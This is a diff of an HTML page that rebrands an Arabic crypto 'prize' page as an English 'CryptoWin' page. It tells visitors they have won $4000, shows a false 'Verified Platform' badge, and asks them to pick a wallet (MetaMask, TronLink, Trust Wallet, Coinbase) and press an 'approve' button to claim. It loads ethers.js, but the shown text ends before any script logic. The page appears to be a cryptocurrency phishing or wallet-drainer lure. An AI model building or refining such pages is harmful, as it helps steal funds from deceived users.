@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>مبروك! لقد فزت بـ 3000 دولار - XYZ</title>
+    <title>Congrats! You've Won $4000 - CryptoWin</title>
     <link
-      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;700&display=swap"
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap"
       rel="stylesheet"
     />
     <script
@@ -22,30 +22,44 @@
         box-sizing: border-box;
       }
       body {
-        font-family: "Tajawal", sans-serif;
-        background: #f4f7fa;
-        color: #333;
+        font-family: "Poppins", sans-serif;
+        background: linear-gradient(135deg, #1a1a1a, #2c2c2c);
+        color: #ffffff;
         min-height: 100vh;
         display: flex;
         justify-content: center;
         align-items: center;
         padding: 20px;
+        overflow-x: hidden;
       }
       .container {
-        background: #ffffff;
-        border-radius: 12px;
+        background: #222222;
+        border-radius: 16px;
         padding: 40px;
-        max-width: 600px;
+        max-width: 700px;
         width: 100%;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        box-shadow: 0 8px 30px rgba(0, 255, 255, 0.2);
         text-align: center;
-        border: 1px solid #e0e0e0;
+        border: 1px solid #00d4ff;
+        animation: fadeIn 1s ease-out;
+      }
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
       }
       .logo {
-        font-size: 36px;
-        font-weight: 700;
-        color: #1a73e8;
+        font-size: 48px;
+        font-weight: 800;
+        color: #00d4ff;
         margin-bottom: 20px;
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        animation: pulse 2s infinite;
+      }
+      @keyframes pulse {
+        0% { text-shadow: 0 0 10px #00d4ff; }
+        50% { text-shadow: 0 0 20px #00d4ff, 0 0 30px #00d4ff; }
+        100% { text-shadow: 0 0 10px #00d4ff; }
       }
       .verified-badge {
         display: flex;
@@ -53,173 +67,204 @@
         justify-content: center;
         gap: 10px;
         font-size: 16px;
-        color: #555;
+        color: #00ff88;
         margin-bottom: 20px;
-        background: #f0f4ff;
-        padding: 8px;
+        background: rgba(0, 255, 136, 0.1);
+        padding: 10px;
         border-radius: 8px;
+        animation: slideIn 0.5s ease-out;
+      }
+      @keyframes slideIn {
+        from { transform: translateX(-20px); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
       }
       .verified-badge i {
-        font-size: 20px;
-        color: #1a73e8;
+        font-size: 24px;
+        color: #00ff88;
       }
       h1 {
-        font-size: 28px;
-        font-weight: 700;
+        font-size: 32px;
+        font-weight: 600;
         margin-bottom: 15px;
-        color: #333;
+        color: #ffffff;
+        text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
       }
       .win-message {
-        font-size: 20px;
-        color: #1a73e8;
-        margin-bottom: 15px;
+        font-size: 22px;
+        color: #00ff88;
+        margin-bottom: 20px;
+        font-weight: 400;
       }
       .coin-icons {
         display: flex;
         justify-content: center;
-        gap: 20px;
-        margin-bottom: 25px;
+        gap: 30px;
+        margin-bottom: 30px;
       }
-      .coin-icons i {
-        font-size: 36px;
-        color: #666;
-        transition: color 0.3s ease;
+      .coin-icons img {
+        width: 60px;
+        height: 60px;
+        object-fit: contain;
+        transition: transform 0.3s ease, filter 0.3s ease;
+        filter: drop-shadow(0 0 10px rgba(0, 255, 255, 0.3));
       }
-      .coin-icons i:hover {
-        color: #1a73e8;
+      .coin-icons img:hover {
+        transform: scale(1.2) rotate(5deg);
+        filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.5));
       }
       .wallet-selection {
         display: flex;
         justify-content: center;
-        gap: 15px;
+        gap: 20px;
         margin-bottom: 30px;
         flex-wrap: wrap;
       }
       .wallet-btn {
-        background: #f8f9fa;
-        border-radius: 10px;
-        padding: 15px;
-        width: 120px;
+        background: #333333;
+        border-radius: 12px;
+        padding: 20px;
+        width: 140px;
         cursor: pointer;
         transition: all 0.3s ease;
-        border: 1px solid #e0e0e0;
+        border: 2px solid #00d4ff;
         display: flex;
         flex-direction: column;
         align-items: center;
-        gap: 10px;
-        color: #333;
+        gap: 12px;
+        color: #ffffff;
         font-weight: 600;
+        position: relative;
+        overflow: hidden;
+      }
+      .wallet-btn::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(0, 212, 255, 0.2), transparent);
+        transition: 0.5s;
+      }
+      .wallet-btn:hover::before {
+        left: 100%;
       }
       .wallet-btn:hover {
-        background: #e8f0fe;
-        border-color: #1a73e8;
-        transform: translateY(-2px);
+        background: #00d4ff;
+        color: #222222;
+        transform: translateY(-3px);
+        box-shadow: 0 5px 15px rgba(0, 212, 255, 0.4);
       }
       .wallet-btn.selected {
-        background: #e8f0fe;
-        border-color: #1a73e8;
-        color: #1a73e8;
+        background: #00ff88;
+        border-color: #00ff88;
+        color: #222222;
       }
       .wallet-btn img {
-        width: 40px;
-        height: 40px;
+        width: 50px;
+        height: 50px;
         object-fit: contain;
       }
-      button {
-        background: #1a73e8;
+      button#approveButton {
+        background: linear-gradient(45deg, #00d4ff, #00ff88);
         border: none;
-        border-radius: 10px;
-        padding: 15px 30px;
+        border-radius: 12px;
+        padding: 15px 40px;
         font-size: 18px;
         font-weight: 600;
-        color: #fff;
+        color: #222222;
         cursor: pointer;
-        transition: background 0.3s ease;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 1px;
       }
-      button:hover {
-        background: #1557b0;
+      button#approveButton:hover {
+        background: linear-gradient(45deg, #00ff88, #00d4ff);
+        transform: scale(1.05);
+        box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
       }
       .status {
         margin-top: 20px;
         font-size: 16px;
         font-weight: 600;
         min-height: 25px;
-        color: #d32f2f;
+        color: #ff4d4d;
       }
       @media (max-width: 480px) {
         .container {
           padding: 20px;
         }
         .logo {
-          font-size: 28px;
+          font-size: 36px;
         }
         h1 {
-          font-size: 24px;
+          font-size: 26px;
         }
         .win-message {
           font-size: 18px;
         }
         .wallet-btn {
-          width: 100px;
+          width: 120px;
         }
-        .coin-icons i {
-          font-size: 28px;
+        .coin-icons img {
+          width: 50px;
+          height: 50px;
         }
-        button {
-          padding: 12px 25px;
-          font-size: 14px;
+        button#approveButton {
+          padding: 12px 30px;
+          font-size: 16px;
         }
       }
     </style>
   </head>
   <body>
     <main class="container">
-      <div class="logo">XYZ WIN</div>
+      <div class="logo">CryptoWin</div>
       <div class="verified-badge">
         <i class="fas fa-check-circle"></i>
-        <span>منصة موثقة</span>
+        <span>Verified Platform</span>
       </div>
-      <h1>مبروك! لقد فزت بـ 4000 دولار</h1>
-      <p class="win-message">استعد لاستلام جائزتك!</p>
+      <h1>Congratulations! You've Won $4000!</h1>
+      <p class="win-message">Get Ready to Claim Your Prize!</p>
       <div class="coin-icons">
-        <i class="fab fa-bitcoin"></i>
-        <i class="fab fa-ethereum"></i>
-        <i class="fas fa-coins"></i>
+        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" />
+        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum" />
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="Tether" />
       </div>
-      <p class="description">اختر محفظتك الرقمية لتفعيل جائزتك مباشرة.</p>
-    <section class="wallet-selection">
-  <button class="wallet-btn" data-wallet="tronlink">
-    <img
-      src="https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg"
-      alt="TronLink"
-    />
-    TronLink
-  </button>
-  <button class="wallet-btn" data-wallet="metamask">
-    <img
-      src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
-      alt="MetaMask"
-    />
-    MetaMask
-  </button>
-  <button class="wallet-btn" data-wallet="trustwallet">
-    <img
-      src="https://trustwallet.com/assets/images/media/assets/TWT.png"
-      alt="TrustWallet"
-    />
-    Trust Wallet
-  </button>
-  <button class="wallet-btn" data-wallet="coinbase">
-    <img
-      src="https://www.coinbase.com/assets/app/wallet-logo.191d39b2.svg"
-      alt="Coinbase Wallet"
-    />
-    Coinbase Wallet
-  </button>
-</section>
-<button id="approveButton">تفعيل الجائزة</button>
-<p class="status" id="statusText"></p>
-</main>
+      <p class="description">Select your digital wallet to claim your prize instantly.</p>
+      <section class="wallet-selection">
+        <button class="wallet-btn" data-wallet="tronlink">
+          <img
+            src="https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg"
+            alt="TronLink"
+          />
+          TronLink
+        </button>
+        <button class="wallet-btn" data-wallet="metamask">
+          <img
+            src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
+            alt="MetaMask"
+          />
+          MetaMask
+        </button>
+        <button class="wallet-btn" data-wallet="trustwallet">
+          <img
+            src="https://trustwallet.com/assets/images/media/assets/TWT.png"
+            alt="TrustWallet"
+          />
+          Trust Wallet
+        </button>
+        <button class="wallet-btn" data-wallet="coinbase">
+          <img
+            src="https://www.coinbase.com/assets/app/wallet-logo.191d39b2.svg"
+            alt="Coinbase Wallet"
+          />
+          Coinbase Wallet
+        </button>
+      </section>
+      <button id="approveButton">Claim Your Prize</button>
+      <p class="status" id="statusText"></p>
+    </main>
 
 <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
 <script>
